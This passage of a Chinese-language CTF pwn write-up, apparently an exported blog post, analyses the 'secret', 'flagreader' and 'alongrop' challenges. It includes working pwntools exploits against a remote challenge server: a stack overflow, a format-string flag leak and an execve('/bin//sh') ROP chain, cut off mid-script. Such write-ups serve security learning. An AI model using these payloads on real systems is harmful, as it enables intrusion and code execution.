class=\"string\">&#x27;43.139.51.42&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">38403</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mode==<span class=\"number\">0</span> :</span><br><span class=\"line\">\tio=process(<span class=\"string\">&quot;./secret&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tio=remote(url,port)</span><br><span class=\"line\">\t</span><br><span class=\"line\">backdoor=<span class=\"number\">0x4014a7</span></span><br><span class=\"line\">offset=<span class=\"number\">0x40</span></span><br><span class=\"line\"></span><br><span class=\"line\">key=[<span class=\"string\">&quot;s&quot;</span>,<span class=\"string\">&quot;1&quot;</span>,<span class=\"string\">&quot;n&quot;</span>,<span class=\"string\">&quot;y&quot;</span>,<span class=\"string\">&quot;e&quot;</span>,<span class=\"string\">&quot;r&quot;</span>]</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">payload=offset*<span class=\"string\">b&#x27;a&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#payload+=p64(backdoor)</span></span><br><span class=\"line\">payload+=<span class=\"string\">b&#x27;\\xc2\\x66\\x33\\x31\\x6e\\x79\\x65\\x72&#x27;</span></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;&gt;&gt;&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"flagreader\"><a href=\"#flagreader\" class=\"headerlink\" title=\"flagreader\"></a>flagreader</h2><h3 id=\"ida分析-2\"><a href=\"#ida分析-2\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><h4 id=\"main函数分析-1\"><a href=\"#main函数分析-1\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204127748.png\" alt=\"image-20250524204127748\"><br>1.开幕雷击，直接就是一个gift给我们。显然是一个地址，可能需要这个地址泄露一些东西。<br>2.同时还有两个函数，一个readflag，一个vuln。直接跟进。</p>\n<h4 id=\"readflag函数分析\"><a href=\"#readflag函数分析\" class=\"headerlink\" title=\"readflag函数分析\"></a>readflag函数分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204334952.png\" alt=\"image-20250524204334952\"><br><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204424654.png\" alt=\"image-20250524204424654\"><br>1.首先看伪代码，发现是把flag读取了0x50字节，写在了<code>&amp;_bss_start[6]._IO_read_end</code>上。但是这个，到底是哪个地址呢？<br>2.观察汇编的代码，可以看到rsi也就读入的地址是rcx，而rcx 又是 rax+0x520，rax又是__bss_start.所以可以知道rsi&#x3D;__bss_start+0x520.<br>3.而我们的gift就是__bss_start.</p>\n<h4 id=\"vuln函数分析\"><a href=\"#vuln函数分析\" class=\"headerlink\" title=\"vuln函数分析\"></a>vuln函数分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204837954.png\" alt=\"image-20250524204837954\"><br>1.非常明显的格式化字符串漏洞，结合上文。第一个想到把flag的地址写入，同时用”%s”对flag内容进行打印。<br>2.64位要加上6，因为有前6个寄存器。最后的偏移还是需要gdb查看。因为可以输入0x10，所以可以把__bss_start+0x520布置在下面。</p>\n<h3 id=\"gdb分析-1\"><a href=\"#gdb分析-1\" class=\"headerlink\" title=\"gdb分析\"></a>gdb分析</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524205449833.png\" alt=\"image-20250524205449833\"><br>1.找到printf函数的栈帧，可以看到我们的输入是在偏移为0 的位置，加上6就是6.<br>2.把地址写在下面的话，偏移就是7。</p>\n<h3 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;43.139.51.42&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">38430</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mode==<span class=\"number\">0</span> :</span><br><span class=\"line\">\tio=process(<span class=\"string\">&quot;./flagreader&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tio=remote(url,port)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Here is your gift: &quot;</span>)</span><br><span class=\"line\">bss_start=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;bss-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(bss_start)))</span><br><span class=\"line\">flag=bss_start+<span class=\"number\">1312</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;%7$s&#x27;</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x41&#x27;</span>)</span><br><span class=\"line\">payload+=p64(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"final\"><a href=\"#final\" class=\"headerlink\" title=\"final\"></a>final</h1><h2 id=\"alongrop\"><a href=\"#alongrop\" class=\"headerlink\" title=\"alongrop\"></a>alongrop</h2><h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524195608074.png\" alt=\"image-20250524195608074\"><br>1.打开第一眼，左边函数特多，加载特慢。静态编译的文件<br>2.如图框出部分，提示ROPchain。同时0x256字节的输入，显然是ROP。<br>3.最后，标记出偏移是0x40+0x8</p>\n<h3 id=\"gdb-ROPgadget-分析\"><a href=\"#gdb-ROPgadget-分析\" class=\"headerlink\" title=\"gdb &amp; ROPgadget 分析\"></a>gdb &amp; ROPgadget 分析</h3><p><code>ROPgadget --binary alongrop --ropchain</code><br><strong>使用命令查看一下ropchain</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- Step <span class=\"number\">5</span> -- Build the ROP chain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"comment\"># execve generated by ROPgadget</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Padding goes here</span></span><br><span class=\"line\">p = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x0000000000404ed2</span>) <span class=\"comment\"># pop rsi ; pop rbp ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c0</span>) <span class=\"comment\"># @ .data</span></span><br><span class=\"line\">\tp += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004211eb</span>) <span class=\"comment\"># pop rax ; ret</span></span><br><span class=\"line\">p += <span class=\"string\">b&#x27;/bin//sh&#x27;</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004205c5</span>) <span class=\"comment\"># mov qword ptr [rsi], rax ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x0000000000404ed2</span>) <span class=\"comment\"># pop rsi ; pop rbp ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">\tp += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000044cf30</span>) <span class=\"comment\"># xor rax, rax ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004205c5</span>) <span class=\"comment\"># mov qword ptr [rsi], rax ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x0000000000402148</span>) <span class=\"comment\"># pop rdi ; pop rbp ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c0</span>) <span class=\"comment\"># @ .data</span></span><br><span class=\"line\">\tp += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x0000000000404ed2</span>) <span class=\"comment\"># pop rsi ; pop rbp ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">\tp += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000040190d</span>) <span class=\"comment\"># pop rdx ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000044cf30</span>) <span class=\"comment\"># xor rax, rax ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004012d3</span>) <span class=\"comment\"># syscall</span></span><br></pre></td></tr></table></figure>\n<p>1.有可以直接写的ROPchain，但是应该不行，因为太长了。我们可以搜寻一下pop_rax;ret,直接将rax设置为0x3b，这样可以减少很多字节。<br>2.然后不要忘记输入ROPchain前有0x40+0x8的垃圾数据要填充。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"></span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;43.139.51.42&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">38369</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mode==<span class=\"number\">0</span> :</span><br><span class=\"line\">\tio=process(<span class=\"string\">&quot;./alongrop&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tio=remote(url,port)</span><br><span class=\"line\"><span class=\"comment\">#gadgets</span></span><br><span class=\"line\">pop_rax=<span class=\"number\">0x00000000004211eb</span></span><br><span class=\"line\">pop_rbx=<span class=\"number\">0x000000000040190d</span></span><br><span class=\"line\">pop_rsi_rbp=<span class=\"number\">0x0000000000404ed2</span></span><br><span class=\"line\">pop_rdi_rbp=<span class=\"number\">0x0000000000402148</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\">offset=<span class=\"number\">0x40</span>+<span class=\"number\">0x8</span></span><br><span class=\"line\">payload=offset*<span class=\"string\">b&quot;a&quot;</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x0000000000404ed2</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c0</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x4141414141414141</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004211eb</span>)</span><br><span class=\"line\">payload+=<span class=\"string\">b&#x27;/bin//sh&#x27;</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004205c5</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x0000000000404ed2</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c8</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x4141414141414141</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x000000000044cf30</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004205c5</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x0000000000402148</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c0</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x4141414141414141</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x0000000000404ed2</span>) <span class=\"comment\"># pop rsi ; pop rbp ; ret</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x000000000040190d</span>) <span class=\"comment\"># pop rdx ; ret</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004211eb</span>)</span><br><span 